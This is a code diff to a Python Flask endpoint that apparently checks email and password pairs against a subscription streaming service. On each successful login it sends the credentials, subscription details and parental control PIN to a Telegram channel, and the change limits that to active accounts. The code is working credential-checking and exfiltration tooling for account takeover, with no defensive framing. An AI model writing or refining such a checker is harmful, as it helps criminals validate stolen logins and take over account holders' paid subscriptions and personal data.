@@ -97,7 +97,8 @@ def vivacheck():
                   f"Subscription Location: {sess.json().get('subscriptionLocation')}\n" \
                   f"Subscription ID: {sess.json().get('subscriptionId')}\n" \
                   f"Parental Control Pin: {sess.json().get('parentalControlPin')}"
-                send_telegram_message(message)
+                if sess.json().get('subscriptionStatus') == "ACTIVE":
+                    send_telegram_message(message)
                 return jsonify({
                     "emeylpassword": f"{email}:{password}",
                     "subscriptionStatus": sess.json().get('subscriptionStatus'),
@@ -113,7 +114,8 @@ def vivacheck():
                 message = f"{email}:{password}\nSubscription Status: {sess.json().get('subscription')['status']}\n" \
                   f"Subscription Location: {sess.json().get('subscription', {}).get('location') or sess.json().get('registerLocation')}\n" \
                   f"Parental Control Pin: {sess.json().get('parentalControlPin')}"
-                send_telegram_message(message)
+                if sess.json().get('subscription')['status'] == "ACTIVE":
+                    send_telegram_message(message)
                 return jsonify({
                     "emeylpassword": f"{email}:{password}",
                     "subscriptionStatus": sess.json().get('subscription')['status'],
@@ -130,7 +132,8 @@ def vivacheck():
                   f"Subscription Location: {login3_response.get('subscriptionLocation')}\n" \
                   f"Subscription ID: {login3_response.get('subscriptionId')}\n" \
                   f"Parental Control Pin: {login3_response.get('parentalControlPin')}"
-            send_telegram_message(message)
+            if login3_response.get('subscriptionStatus') == "ACTIVE" :    
+                send_telegram_message(message)
             return jsonify({
                 "emeylpassword": f"{email}:{password}",
                 "subscriptionStatus": login3_response.get('subscriptionStatus'),
